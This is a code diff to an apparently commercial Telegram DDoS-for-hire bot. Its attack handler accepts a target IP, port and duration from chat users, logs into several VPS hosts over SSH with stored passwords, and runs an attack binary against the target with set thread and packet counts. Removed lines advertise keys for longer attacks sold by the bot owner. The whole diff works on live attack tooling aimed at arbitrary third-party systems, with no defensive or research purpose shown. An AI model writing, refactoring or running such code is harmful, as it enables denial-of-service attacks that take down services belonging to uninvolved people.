@@ -46,6 +46,9 @@ SPECIAL_MAX_DURATION = 240
 SPECIAL_MAX_THREADS = 2000
 BOT_START_TIME = time.time()
 
+DEFAULT_THREADS = 900
+DEFAULT_PACKET = 64
+
 ACTIVE_VPS_COUNT = 6  # डिफॉल्ट रूप से 6 VPS इस्तेमाल होंगे
 # Display Name Configuration
 GROUP_DISPLAY_NAMES = {}  # Key: group_id, Value: display_name
@@ -1561,139 +1564,130 @@ async def attack_input(update: Update, context: CallbackContext):
     global last_attack_time, running_attacks
 
     args = update.message.text.split()
-    if len(args) != 3:  # Expecting <ip> <port> <duration>
+    if len(args) != 3:
         current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
         await update.message.reply_text(
             f"❌ *Invalid input! Please enter <ip> <port> <duration>*\n\n"
-            f"👑 *Bot Owner:* {current_display_name}\n"
-            f"💬 *Need a key for 200s? DM:* {current_display_name}",
-            parse_mode='Markdown'
-        )
-        return ConversationHandler.END
-
-    ip, port, duration = args
-    duration = int(duration)
-    
-    # Set default threads
-    user_id = update.effective_user.id
-    is_special = False
-    threads = MAX_THREADS  # Default threads for normal users
-    
-    if user_id in redeemed_users:
-        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
-            is_special = True
-            threads = SPECIAL_MAX_THREADS  # Default threads for special key users
-    
-    if duration > max_duration and not is_special:
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
-        await update.message.reply_text(
-            f"❌ *Attack duration exceeds 120 seconds!*\n"
-            f"🔑 *For 200 seconds attacks, you need a special key.*\n\n"
-            f"👑 *Buy keys from:* {current_display_name}",
-            parse_mode='Markdown'
-        )
-        return ConversationHandler.END
-
-    max_allowed_duration = SPECIAL_MAX_DURATION if is_special else max_duration
-
-    if duration > max_allowed_duration:
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
-        await update.message.reply_text(
-            f"❌ *Attack duration exceeds the max limit ({max_allowed_duration} sec)!*\n\n"
             f"👑 *Bot Owner:* {current_display_name}",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
-    last_attack_time = time.time()
-    
-    # Calculate threads per VPS
-    total_vps = len(VPS_LIST)
-    if total_vps == 0:
-        await update.message.reply_text("❌ No VPS available for attack!", parse_mode='Markdown')
+    ip, port, duration = args
+
+    # Validate inputs
+    if not validate_ip(ip):
+        await update.message.reply_text("❌ *Invalid IP address!*", parse_mode='Markdown')
         return ConversationHandler.END
-        
-    threads_per_vps = threads // total_vps
-    remaining_threads = threads % total_vps
-    
+    if not validate_port(port):
+        await update.message.reply_text("❌ *Invalid port number!*", parse_mode='Markdown')
+        return ConversationHandler.END
+    try:
+        duration = int(duration)
+        if duration <= 0:
+            raise ValueError
+    except ValueError:
+        await update.message.reply_text("❌ *Duration must be a positive integer!*", parse_mode='Markdown')
+        return ConversationHandler.END
+
+    # Duration limit check
+    if duration > MAX_DURATION:
+        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        await update.message.reply_text(
+            f"❌ *Attack duration exceeds the max limit ({MAX_DURATION} sec)!*\n\n"
+            f"👑 *Bot Owner:* {current_display_name}",
+            parse_mode='Markdown'
+        )
+        return ConversationHandler.END
+
+    # Cooldown check
+    if time.time() - last_attack_time < COOLDOWN_SECONDS:
+        await update.message.reply_text(
+            f"❌ *Please wait {COOLDOWN_SECONDS} seconds before starting another attack!*",
+            parse_mode='Markdown'
+        )
+        return ConversationHandler.END
+
+    # VPS availability check
+    if not VPS_LIST or ACTIVE_VPS_COUNT > len(VPS_LIST):
+        await update.message.reply_text("❌ *No VPS available or invalid configuration!*", parse_mode='Markdown')
+        return ConversationHandler.END
+
+    last_attack_time = time.time()
+    total_vps = len(VPS_LIST[:ACTIVE_VPS_COUNT])
+    threads_per_vps = DEFAULT_THREADS // total_vps
+    remaining_threads = DEFAULT_THREADS % total_vps
     attack_id = f"{ip}:{port}-{time.time()}"
-    
-    attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
     current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
-    
+
     # Send attack started message
     start_message = await update.message.reply_text(
-        f"{attack_type}\n"
+        f"⚔️ *Attack Started!*\n"
         f"🎯 *Target*: {ip}:{port}\n"
         f"🕒 *Duration*: {duration} sec\n"
-        f"🧵 *Total Power*: {threads} threads\n"
+        f"🧵 *Total Power*: {DEFAULT_THREADS} threads\n"
         f"👑 *Bot Owner:* {current_display_name}\n\n"
         f"🔥 *ATTACK STARTED! /running * 💥",
         parse_mode='Markdown'
     )
 
     async def _run_ssh_attack(vps, threads_for_vps, attack_num, context):
-        """Asynchronous SSH attack function"""
         ip_vps, username, password = vps
         attack_id_vps = f"{attack_id}-{attack_num}"
-        
-        # Register this attack
         running_attacks[attack_id_vps] = {
-            'user_id': user_id,
+            'user_id': update.effective_user.id,
             'start_time': time.time(),
             'duration': duration,
-            'is_special': is_special,
             'vps_ip': ip_vps
         }
-        
+
         try:
             async with asyncssh.connect(
                 ip_vps, username=username, password=password, known_hosts=None, keepalive_interval=30
             ) as conn:
-                command = f"{BINARY_PATH} {ip} {port} {duration} 512 {threads_for_vps}"
+                command = f"{BINARY_PATH} {ip} {port} {duration} {DEFAULT_PACKET} {threads_for_vps}"
+                logging.info(f"User {update.effective_user.id} executing on {ip_vps}: {command}")
                 async with conn.create_process(command, term_type=None) as process:
-                    # Wait for the command to complete or timeout
-                    start_time = time.time()
                     try:
                         await asyncio.wait_for(process.wait(), timeout=duration + 10)
                     except asyncio.TimeoutError:
                         logging.warning(f"Command timed out on VPS {ip_vps}")
                         process.terminate()
-                    
                     logging.info(f"Attack finished on VPS {ip_vps}")
-                    
         except Exception as e:
             logging.error(f"SSH error on {ip_vps}: {str(e)}")
-        finally:
-            # Remove from running attacks when done
-            if attack_id_vps in running_attacks:
-                del running_attacks[attack_id_vps]
-            
-            # Check if all attacks for this target are done
-            active_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
-            if not active_attacks:
-                # All attacks finished for this target
+            if str(e).lower().find("connection") != -1:
                 await context.bot.send_message(
-                    chat_id=update.effective_chat.id,
-                    text=f"✅ *Attack Finished!*\n"
-                         f"🎯 *Target*: {ip}:{port}\n"
-                         f"🕒 *Duration*: {duration} sec\n"
-                         f"🧵 *Total Power*: {threads} threads\n"
-                         f"👑 *Bot Owner:* {current_display_name}\n\n"
-                         f"🔥 *ATTACK COMPLETED!*",
+                    chat_id=OWNER_ID,
+                    text=f"SSH connection failed for user {update.effective_user.id} on {ip_vps}: {str(e)}",
                     parse_mode='Markdown'
                 )
+        finally:
+            with attack_lock:
+                if attack_id_vps in running_attacks:
+                    del running_attacks[attack_id_vps]
+                active_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
+                if not active_attacks:
+                    await context.bot.send_message(
+                        chat_id=update.effective_chat.id,
+                        text=f"✅ *Attack Finished!*\n"
+                             f"🎯 *Target*: {ip}:{port}\n"
+                             f"🕒 *Duration*: {duration} sec\n"
+                             f"🧵 *Total Power*: {DEFAULT_THREADS} threads\n"
+                             f"👑 *Bot Owner:* {current_display_name}\n\n"
+                             f"🔥 *ATTACK COMPLETED!*",
+                        parse_mode='Markdown'
+                    )
 
     try:
-        # Create tasks for all VPS attacks
         tasks = []
         for i, vps in enumerate(VPS_LIST[:ACTIVE_VPS_COUNT]):
             threads_for_vps = threads_per_vps + (1 if i < remaining_threads else 0)
             if threads_for_vps > 0:
                 tasks.append(_run_ssh_attack(vps, threads_for_vps, i, context))
         
-        # Run all attacks concurrently
         if tasks:
+            context.bot_data['attack_tasks'] = context.bot_data.get('attack_tasks', []) + tasks
             await asyncio.gather(*tasks, return_exceptions=True)
         else:
             await update.message.reply_text(
@@ -1701,7 +1695,6 @@ async def attack_input(update: Update, context: CallbackContext):
                 f"👑 *Bot Owner:* {current_display_name}",
                 parse_mode='Markdown'
             )
-    
     except Exception as e:
         logging.error(f"Error starting attack tasks: {str(e)}")
         await update.message.reply_text(
@@ -1710,7 +1703,7 @@ async def attack_input(update: Update, context: CallbackContext):
             f"👑 *Bot Owner:* {current_display_name}",
             parse_mode='Markdown'
         )
-    
+
     return ConversationHandler.END
 
 async def set_cooldown_start(update: Update, context: CallbackContext):
